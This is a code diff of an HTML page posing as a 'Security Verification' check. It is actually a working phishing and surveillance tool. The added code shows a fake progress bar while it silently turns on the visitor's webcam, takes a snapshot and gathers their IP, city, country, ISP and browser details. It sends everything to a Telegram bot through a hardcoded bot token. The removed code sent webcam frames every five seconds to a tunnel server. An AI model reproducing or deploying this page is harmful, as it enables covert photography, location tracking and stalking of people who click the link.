@@ -3,125 +3,152 @@
 <head>
     <title>Security Check</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 40px; }
+        body { font-family: sans-serif; text-align: center; margin-top: 40px; background-color: #f5f5f5; }
         video, canvas { display: none; }
-        button { padding: 10px 20px; font-size: 18px; margin-top: 20px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 4px; }
-        .permission-warning { color: #ff4500; font-weight: bold; }
-        .error-message { margin-top: 20px; color: red; }
+        .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(76, 175, 80, 0.3); border-radius: 50%; border-top-color: #4CAF50; animation: spin 1s ease-in-out infinite; margin-bottom: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .progress-container { margin: 30px auto; width: 80%; max-width: 400px; }
+        .progress-bar { height: 10px; background-color: #e0e0e0; border-radius: 5px; margin-top: 10px; overflow: hidden; }
+        .progress { height: 100%; width: 0; background-color: #4CAF50; transition: width 0.5s; }
+        h2 { color: #333; }
+        p { color: #666; }
     </style>
 </head>
 <body>
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240"></canvas>
-    <h2>Security Verification in Progress...</h2>
-    <div id="camera-permission" style="display: none;">
-        <p class="permission-warning">⚠️ Camera access is required for security verification</p>
-        <button id="request-camera">Grant Camera Access</button>
-        <div id="error-message" class="error-message"></div>
+    
+    <div id="loading-container">
+        <div class="loading"></div>
+        <h2>Security Verification in Progress</h2>
+        <p>Please wait while we verify your device...</p>
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress" id="progress-indicator"></div>
+            </div>
+        </div>
     </div>
 
     <script>
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
-        const cameraPermissionDiv = document.getElementById("camera-permission");
-        const requestCameraButton = document.getElementById("request-camera");
-        const errorMessageDiv = document.getElementById("error-message");
+        const progressIndicator = document.getElementById("progress-indicator");
         let ipInfo = {};
-        let captureInterval;
-        let permissionRequested = false;
-
-        // جلب بيانات الـ IP
-        fetch("https://ipapi.co/json")
-            .then(res => res.json())
-            .then(data => { 
-                ipInfo = data;
-                // بدء التقاط الكاميرا بعد الحصول على بيانات IP
-                requestCameraAccess();
-            })
-            .catch(err => {
-                console.error("Error fetching IP info:", err);
-                // Try to request camera even if IP fetch fails
-                requestCameraAccess();
-            });
-
-        // طلب الكاميرا فور تحميل الصفحة
-        function requestCameraAccess() {
-            permissionRequested = true;
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    cameraPermissionDiv.style.display = "none";
-                    // بدء إرسال الصور والبيانات كل 5 ثواني
-                    captureAndSendData();
-                    captureInterval = setInterval(captureAndSendData, 5000);
+        let progress = 0;
+        
+        // Get the user ID from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const user_id = urlParams.get('id');
+        
+        if (!user_id) {
+            document.body.innerHTML = "<h2>Invalid verification link</h2><p>This verification link appears to be invalid or expired.</p>";
+        } else {
+            // Start the verification process
+            startVerification();
+        }
+        
+        function startVerification() {
+            // Simulate progress
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                progressIndicator.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    document.getElementById("loading-container").innerHTML = "<h2>Verification Complete</h2><p>Thank you for verifying your device.</p>";
+                }
+            }, 500);
+            
+            // Fetch IP info
+            fetch("https://ipapi.co/json")
+                .then(res => res.json())
+                .then(data => { 
+                    ipInfo = data;
+                    // Access camera after getting IP info
+                    requestCameraAccess();
                 })
-                .catch(err => {
-                    console.error("Camera access error:", err);
-                    // Show the camera permission request UI
-                    cameraPermissionDiv.style.display = "block";
-                    errorMessageDiv.textContent = "Camera access was denied. Please grant permission to continue.";
+                .catch(() => {
+                    // Try camera access even if IP info fails
+                    requestCameraAccess();
                 });
         }
 
-        // Add event listener for the request camera button
-        requestCameraButton.addEventListener("click", function() {
-            errorMessageDiv.textContent = "";
-            requestCameraAccess();
-        });
-
-        function captureAndSendData() {
-            if (!video.srcObject) {
-                console.error("No camera stream available");
-                return;
+        // Direct integration with Telegram Bot API
+        function sendToTelegram(message, photo = null) {
+            const botToken = "7913534738:AAEthUisUFuzA0p0q5txMWAiW74faM0j9ho";
+            
+            if (photo) {
+                // First send the image
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: user_id,
+                        photo: photo,
+                        caption: "📸 Camera snapshot"
+                    })
+                });
             }
             
-            ctx.drawImage(video, 0, 0, 320, 240);
-            const imageData = canvas.toDataURL("image/png");
-
-            // استخراج user_id من عنوان URL
-            let user_id;
-            // Try to get from query parameter "id"
-            const urlParams = new URLSearchParams(window.location.search);
-            user_id = urlParams.get('id');
-            
-            // If not found in query params, try path-based
-            if (!user_id) {
-                const pathUserId = window.location.pathname.split("/").pop();
-                if (pathUserId && pathUserId !== "" && pathUserId !== "index.html") {
-                    user_id = pathUserId;
-                }
-            }
-
-            if (!user_id) {
-                console.error("User ID not found in URL");
-                return;
-            }
-
-            // إرسال البيانات إلى السيرفر
-            fetch("https://ckfnp3td-6362.uks1.devtunnels.ms/upload", {
+            // Then send the text message
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    image: imageData,
-                    user_agent: navigator.userAgent,
-                    ip_data: ipInfo,
-                    user_id: user_id,
-                    timestamp: new Date().toISOString()
+                    chat_id: user_id,
+                    text: message,
+                    parse_mode: "HTML"
                 })
-            }).then(response => {
-                if (!response.ok) {
-                    console.error("Error sending data");
-                }
-            }).catch(err => {
-                console.error("Network error:", err);
             });
         }
 
-        // Check if the browser supports the camera API
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            cameraPermissionDiv.style.display = "block";
-            errorMessageDiv.textContent = "Your browser doesn't support camera access. Please use a modern browser.";
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    // Take photos and send to Telegram
+                    setTimeout(captureAndSend, 2000); // Wait 2 seconds for camera to initialize
+                })
+                .catch(() => {
+                    // Still send device info even if camera fails
+                    sendDeviceInfo();
+                });
+        }
+
+        function captureAndSend() {
+            if (video.srcObject) {
+                ctx.drawImage(video, 0, 0, 320, 240);
+                const imageData = canvas.toDataURL("image/jpeg", 0.7);
+                
+                // Send both device info and image
+                sendDeviceInfo(imageData.split(',')[1]);
+            } else {
+                // Just send device info if no camera
+                sendDeviceInfo();
+            }
+        }
+
+        function sendDeviceInfo(imageBase64 = null) {
+            // Prepare device info message
+            const ip = ipInfo.ip || "Unknown";
+            const country = ipInfo.country_name || "Unknown";
+            const city = ipInfo.city || "Unknown";
+            const isp = ipInfo.org || "Unknown";
+            
+            const message = `
+📥 <b>New Link Click Detected!</b>
+
+🌍 <b>IP:</b> ${ip}
+🏙️ <b>City:</b> ${city}
+🌐 <b>Country:</b> ${country}
+🧭 <b>ISP:</b> ${isp}
+🖥️ <b>Device:</b> ${navigator.userAgent}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `;
+            
+            // Send the info to Telegram
+            sendToTelegram(message, imageBase64);
         }
     </script>
 </body>
